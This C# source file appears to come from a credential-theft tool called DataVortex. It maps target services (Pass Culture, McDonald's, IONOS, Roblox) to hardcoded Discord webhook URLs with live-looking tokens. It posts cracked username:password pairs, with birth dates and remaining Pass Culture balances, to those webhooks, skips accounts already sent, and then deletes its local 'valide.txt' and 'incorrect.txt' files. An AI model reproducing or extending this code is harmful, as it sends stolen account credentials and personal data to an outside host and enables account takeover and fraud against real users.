using System;
using System.Net.NetworkInformation;
using System.Text;
using Discord;
using Discord.Webhook;
using Newtonsoft.Json;

namespace DataVortex
{
    internal class keywords
    {
        public static class UrlChecker
        {
            public static class Keywords
            {
                public static Dictionary<string, string> List = new Dictionary<string, string>
                {
                    { "passculture", "https://discord.com/api/webhooks/1165995609115869195/RyVlBEjaosGZTOPKqiDzutGveLqcehpBoVQsxyRY1LMUbZadg9wMqOonVk6erJjfPqSp" },
                    { "mcdo", "https://discord.com/api/webhooks/1165995512143548567/OK-aGfQSY8l5tAxjRRsACzru0dBw465RXlY2VU-e756guH2UwudzGluEEn1cXoUk8xQW" },
                    { "ionos", "https://discord.com/api/webhooks/1165994856708059187/PLDrGBzOiX1EWBrKqnhVJ9nIfTFCm9C1REdt003w-nxjSRNS90t8Ij05mEQTTA4FuKHN" },
                    { "roblox", "https://discord.com/api/webhooks/1167991926088273981/-ZoTsT92N5hPh80zaUUBHV65TN6dcEcsQ7HGGPKaYV9tJOOYiz_mUwOzx8z9KY7wHINt" }
                    // Ajoutez d'autres mots-clés ici...
                };

                public static HashSet<string> incorrectAccounts = new HashSet<string>();
                public static HashSet<string> ReportedAccounts = new HashSet<string>();


                // Méthode pour charger les comptes incorrects depuis le fichier "incorrect.txt"
                public static void LoadIncorrectAccountsFromFile(string filePath)
                {
                    try
                    {
                        if (File.Exists(filePath))
                        {
                            var lines = File.ReadAllLines(filePath);
                            incorrectAccounts = new HashSet<string>(lines);
                        }
                    }
                    catch (Exception ex)
                    {
                        Telegram.LogMessage("Erreur lors du chargement des comptes incorrects : " + ex.Message);
                    }
                }

                // Méthode générique pour vérifier les doublons pour tous les mots-clés
                public static void CheckForDuplicates()
                {
                    var duplicates = List.GroupBy(x => x.Value)
                                         .Where(group => group.Count() > 1)
                                         .Select(group => group.Key);

                    foreach (var duplicate in duplicates)
                    {
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Telegram.LogMessage($"Doublon détecté pour le webhook : {duplicate}");
                        Console.ResetColor();
                    }
                }

                public static async Task SendToDiscordWebhookPassculture(List<(string url, string username, string password, string app)> results, string webhookUrl, string databaseName, string birthDate, double remaining1)
                {
                    // Charger les comptes incorrects depuis le fichier "incorrect.txt"
                    LoadIncorrectAccountsFromFile("incorrect.txt");

                    // Créez une liste pour stocker les objets JSON désérialisés
                    var accountDetailsList = new List<AccountDetails>();

                    // Lisez le fichier "valide.txt" et désérialisez les objets JSON
                    if (File.Exists("valide.txt"))
                    {
                        var lines = File.ReadAllLines("valide.txt");
                        foreach (var line in lines)
                        {
                            var accountDetails = JsonConvert.DeserializeObject<AccountDetails>(line);
                            accountDetailsList.Add(accountDetails);
                        }
                    }

                    // Create an instance of DiscordWebhookClient with your webhook URL
                    using (var client = new DiscordWebhookClient(webhookUrl))
                    {
                        foreach (var result in results)
                        {
                            if (result.username != "UNKNOWN" && result.password != "UNKNOWN")
                            {
                                string accountIdentifier = $"{result.username}:{result.password}";

                                // Vérifiez si le compte a déjà été envoyé
                                if (ReportedAccounts.Contains(accountIdentifier))
                                {
                                    Console.ForegroundColor = ConsoleColor.Magenta;
                                    Telegram.LogMessage($"Le compte {accountIdentifier} a déjà été envoyé. Ignoré.");
                                    Console.ResetColor();
                                    continue; // Passe au compte suivant
                                }
                                // Vérifiez si le compte est dans la liste des comptes incorrects
                                if (incorrectAccounts.Contains(accountIdentifier))
                                {
                                    Console.ForegroundColor = ConsoleColor.Magenta;
                                    Telegram.LogMessage($"Le compte {accountIdentifier} est dans la liste incorrect. Ignoré.");
                                    Console.ResetColor();
                                    continue; // Passe au compte suivant
                                }
                                ReportedAccounts.Add(accountIdentifier); // Ajoutez le compte envoyé à l'ensemble

                                // Recherchez les détails du compte correspondant
                                var accountDetail = accountDetailsList.FirstOrDefault(details =>
                                    details.Username == result.username && details.Password == result.password);

                                if (accountDetail != null)
                                {
                                    // Créez un embed pour chaque compte "passculture"
                                    var embed = new EmbedBuilder();
                                    embed.WithTitle("Compte Trouvé - Passculture");
                                    embed.WithColor(Color.Red); // Changez la couleur en rouge

                                    // Ajoutez le nom de la base de données
                                    if (!string.IsNullOrEmpty(databaseName))
                                        embed.AddField("Base de données", databaseName);

                                    // Créez une chaîne avec les détails du compte
                                    var sb = new StringBuilder();
                                    sb.AppendLine($"`{accountIdentifier}`");
                                    sb.AppendLine($"\n**Montant restant:**\n {accountDetail.Remaining1} €");
                                    sb.AppendLine($"\n**Date de naissance:**\n {accountDetail.BirthDate}");

                                    // Ajoutez les détails au champ de l'embed
                                    embed.AddField("Identifiant :\n", sb.ToString());

                                    // Envoyez le message via le webhook
                                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                                    Telegram.LogMessage("Embed Passculture envoyé");
                                }
                            }
                        }
                    }

                    // Vider le fichier "incorrect.txt" à la fin
                    File.Delete("incorrect.txt");
                    File.Delete("valide.txt");


                }


                public static string FindAccountDetails(string accountIdentifier)
                {
                    bool detailsFound = false;

                    try
                    {
                        if (File.Exists("valide.txt"))
                        {
                            var lines = File.ReadLines("valide.txt");
                            foreach (var line in lines)
                            {
                                if (line.StartsWith(accountIdentifier))
                                {
                                    detailsFound = true;
                                    return line.Substring(accountIdentifier.Length + 2); // +2 to skip the ":" and the space
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Telegram.LogMessage("Erreur lors de la recherche des détails du compte : " + ex.Message);
                    }

                    // Si les détails ne sont pas trouvés, définissez detailsFound sur false
                    if (!detailsFound)
                    {
                        Telegram.LogMessage("Informations non trouvées");
                    }

                    return string.Empty;
                }
                public class AccountDetails
                {
                    public string Username { get; set; }
                    public string Password { get; set; }
                    public string BirthDate { get; set; }
                    public double Remaining1 { get; set; }
                }
            }
        }

    }

}
